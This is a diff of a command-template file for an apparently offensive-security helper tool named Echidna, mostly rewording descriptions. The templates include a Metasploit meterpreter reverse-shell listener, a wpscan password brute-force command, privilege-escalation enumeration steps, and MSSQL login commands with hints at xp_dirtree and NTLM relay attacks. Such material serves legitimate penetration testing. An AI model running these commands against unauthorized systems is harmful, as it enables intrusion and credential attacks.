@@ -220,7 +220,7 @@ group: Useful Command
 [end]
 
 [Echidna]
-description: create reverse shell by msfvenom
+description: create tcp lister by metasploit
 template: msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lport 4444; set lhost {localip};"
 group: Useful Command
 [end]
@@ -304,7 +304,7 @@ group: 5985_WinRM
 [end]
 
 [Echidna]
-description: check network service, open port only for local network might be interesting for priv esc
+description: check network service, open port only for local network might be interesting for privilge escalation
 template: netstat -antup
 condition: ["isInitialShellEstablished"]
 group: Privilege Escalation Command
@@ -318,14 +318,14 @@ group: Privilege Escalation Command
 [end]
 
 [Echidna]
-description: enumerate root process
+description: enumerate root process, root process may be abused for privilege escalation
 template: ps aux | grep root
 condition: ["isInitialShellEstablished"]
 group: Privilege Escalation Command
 [end]
 
 [Echidna]
-description: check kernel version which is important for privesc
+description: check kernel version which is important for privesc. If it is old, you can exploit for privilege escalation.
 template: uname -a
 condition: ["isInitialShellEstablished"]
 group: Privilege Escalation Command
@@ -335,7 +335,7 @@ group: Privilege Escalation Command
 description: wordpress vulnerability scan by wpscan
 template: wpscan --url http://{host}/  -f cli-no-colour
 template: wpscan --url http://{host}/  -f cli-no-colour -e at -e ap -e u
-template: wpscan --url http://{host}/ -f cli-no-colour -U $username$ -P $passwordfile$ --force
+template: wpscan --url http://{host}/ -f cli-no-colour -U {user} -P {passwordfile} --force
 condition: ["http", "https", "80", "443"]
 group: 80_HTTP
 [end]
@@ -453,7 +453,7 @@ group: 6667_IRC
 [end]
 
 [Echidna]
-description: mssqlclient.py is the script from Impacket collection that can be used in order to establish an authenticated connection to a MS SQL Server. If you can login, you may be able to attack by xp_dirtree or NTLM Relay. 
+description: mssqlclient.py is the script from Impacket collection that can be used in order to establish an authenticated connection to a MS SQL Server.\n If you can login, you may be able to attack by xp_dirtree or NTLM Relay.
 template: mssqlclient.py [-db volume] {DOMAIN}/{USER}:{PASSWORD}@{host}
 template: mssqlclient.py [-db volume] -windows-auth {DOMAIN}/{USER}:{PASSWORD}@{host}
 condition: ["1433", "mssql"]
